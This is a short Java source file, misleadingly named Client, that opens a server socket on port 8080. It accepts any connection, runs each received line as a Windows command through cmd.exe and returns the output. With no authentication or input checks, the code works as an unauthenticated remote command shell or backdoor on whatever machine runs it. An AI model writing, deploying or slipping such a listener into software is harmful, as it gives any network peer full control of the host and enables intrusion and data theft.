import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Client {
    private static final int PORT = 8080;

    public static void main(String[] args) throws IOException, InterruptedException {
        ServerSocket serverSocket = new ServerSocket(PORT);
        System.out.println("Waiting for clients to connect...");

        while (true) {
            Socket socket = serverSocket.accept();
            System.out.println("Client connected: " + socket.getInetAddress());

            BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter output = new PrintWriter(socket.getOutputStream(), true);

            String command = input.readLine();

            if (command != null && !command.isEmpty()) {
                // Process the command and send the response back to the client
                String response = processCommand(command);
                output.println(response);
            }

            input.close();
            output.close();
            socket.close();
        }
    }

    private static String processCommand(String command) throws IOException, InterruptedException {


        // Execute the command
        Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});

        // Print the command output
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        String erg = "";
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
            erg += line;
            erg+="\n";
        }

        // Wait for the command to finish
        process.waitFor();
        return "Command received: " + erg;

    }
}